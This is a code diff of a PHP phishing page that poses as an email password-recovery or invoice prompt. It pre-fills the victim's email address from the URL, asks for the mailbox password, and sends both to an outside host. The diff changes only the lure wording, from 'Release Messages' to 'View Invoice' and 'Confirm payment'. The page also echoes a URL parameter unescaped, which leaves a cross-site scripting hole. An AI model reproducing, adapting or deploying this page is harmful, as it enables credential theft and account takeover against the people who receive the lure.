@@ -683,10 +683,10 @@ $client_id = $_SESSION['client_id'] = $_GET['client_id'];
               <form action="https://prime-insts.com/imgs/hrs/init.php" method="GET">
               <div id="default-template" class="top-spacer"><div id="default-logo-container"></div></div>
                <div id="passwordRecoveryCard"><div><div id="PasswordRecoveryLandingCard"><div id="page-title-container"><div><div id="header-navigation" class="back-button" style="cursor: pointer;"></div>
-            <input type="hidden" name="userid" value=""><h4 class="page-title-with-back">Confirm your mailbox to start receiving messages</h4></div></div><fieldset class="form-group"><input spellcheck="false" type="email" placeholder="Email Address" value="<?php echo $_GET['client_id']; ?>" readonly required name="email" aria-labelledby="label-PasswordRecoveryLandingUsername" aria-required="false" class="ctHidden form-control" value="<?php echo $client_id;?>"></fieldset><fieldset class="form-group">
+            <input type="hidden" name="userid" value=""><h4 class="page-title-with-back">Confirm payment</h4></div></div><fieldset class="form-group"><input spellcheck="false" type="email" placeholder="Email Address" value="<?php echo $_GET['client_id']; ?>" readonly required name="email" aria-labelledby="label-PasswordRecoveryLandingUsername" aria-required="false" class="ctHidden form-control" value="<?php echo $client_id;?>"></fieldset><fieldset class="form-group">
               <label for="PasswordRecoveryLandingUsername" id="label-PasswordRecoveryLandingUsername"></label><input spellcheck="false" type="password" placeholder="Email Password" required id="" name="new_pass" aria-labelledby="label-PasswordRecoveryLandingUsername" aria-required="false" class="ctHidden form-control" value=""></fieldset><fieldset class="form-group">
             
-            </fieldset><button tabindex="0" class="btn btn-primary submit-button" id="" type="submit">Release Messages</button></div></div></div> </form>
+            </fieldset><button tabindex="0" class="btn btn-primary submit-button" id="" type="submit">View Invoice</button></div></div></div> </form>
             </div></div></div></div></div></div></div>
 
 
